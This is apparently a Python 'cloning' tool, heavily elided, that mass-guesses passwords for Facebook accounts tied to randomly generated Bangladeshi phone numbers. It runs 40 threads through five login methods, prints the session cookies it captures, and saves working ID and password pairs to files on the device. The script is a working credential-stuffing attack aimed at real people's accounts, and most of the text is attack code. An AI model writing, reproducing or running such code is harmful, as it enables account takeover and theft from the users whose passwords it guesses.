...
\033[1;97m ╔══════════════════════════════════════╗   
 ...
 \033[1;97m╚══════════════════════════════════════╝
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║\033[1;95mOwner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mASRAFUL ISLAM JAHID \033[1;90m<\033[1;92m•\033[1;90m] \033[1;95mV-01\033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)
contactinfo = (""" 
\033[1;97m ╔══════════════════════════════════════╗   
 ...
 \033[1;97m╚══════════════════════════════════════╝
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║   \033[1;95m Owner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93m JAHID     \033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)
def Cloning_Linex():
...
def Nodi_JAHID():
    ...
    os.system('clear');print(logo);print("  \033[1;35m[\033[1;32m1\033[1;35m]\033[1;32m BD RANDOM \033[1;35m[\033[1;32m2\033[1;35m]\033[1;32m MY CONTACT INFO \033[1;35m[\033[1;32m0\033[1;35m]\033[1;32m CLOSED TOOLS");Al_JAHID();Tahrima = input(f'  \033[1;91m[\033[1;97m?\033[1;91m]\033[1;32m CHOICE YOUR OPTION :\033[1;36m ')
    if Tahrima in ["1","A","a"]:
        Nodi()
    if Tahrima in ["2","B","b"]:
        Contact()
    if Tahrima in ["0","E","e"]:
    	...
    	print("  \033[1;35m[\033[1;32m×\033[1;35m]\033[1;32m Worning Typ");Nodi_JAHID()
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
#••••••••••••••••••••••CONTACT INFO•••••••••••••••••••••••••••#
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
def Contact():
	...
	if Tymin in ['6']:
		os.system('xdg-open wa.me/+88018***')
	if Tymin in ['7']:
		os.system('xdg-open t.me/fuck_344')
	if Tymin in ['8']:
		os.system('xdg-open https://github.com/Copy-xyz')
	if Tymin in ['9']:
		Nodi_JAHID()
	if Tymin in ['0']:
...
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=40) as JAHID_Asha:
        os.system('clear')
        print(cloninglogo)
        Contact_Linex()
        tl = str(len(user))
        ...
        for love in user:
            ...
            uid = code+love
            if 'M1' in nabil:
            	JAHID_Asha.submit(Asraful1,uid,pwx,tl)
            elif 'M2' in nabil:
            	JAHID_Asha.submit(Asraful2,uid,pwx,tl)
            elif 'M3' in nabil:
            	JAHID_Asha.submit(Asraful3,uid,pwx,tl)
            elif 'M4' in nabil:
            	JAHID_Asha.submit(Asraful4,uid,pwx,tl)
            elif 'M5' in nabil:
            	JAHID_Asha.submit(Asraful5,uid,pwx,tl)
            else:
            	JAHID_Asha.submit(Asraful1,uid,pwx,tl)
#•••••••••••••••••••••••••M-UPDATE M1••••••••••••••••••••••••••#
#••••••••••••••••••••SCRIPT MATHOID M1•••••••••••••••••••••#
...
def Asraful1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.flush()
            ashaJAHID = random.choice(bangla)
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mJAHID-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;32m'+coki);open('/sdcard/JAHID-OK-M1.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('  \033[1;90m[JAHID-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/JAHID-CP-M1.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mJAHID-OᏦ\033[1;96m]\033[1;93m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;91m'+coki);open('/sdcard/JAHID-OK-M2.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[JAHID-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/JAHID-CP-M2.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mJAHID-OᏦ\033[1;96m]\033[1;97m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;93mCOOKIE : \033[1;95m'+coki);open('/sdcard/JAHID-OK-M3.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[JAHID-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/JAHID-CP-M3.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mJAHID-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');open('/sdcard/JAHID-OK-M4.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[JAHID-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/JAHID-CP-M4.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mJAHID-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;97m'+coki);open('/sdcard/JAHID-OK-M5.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[JAHID-ᏟᏢ] '+uid+' | '+ps+' \n')open('/sdcard/JAHID-CP-M5.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
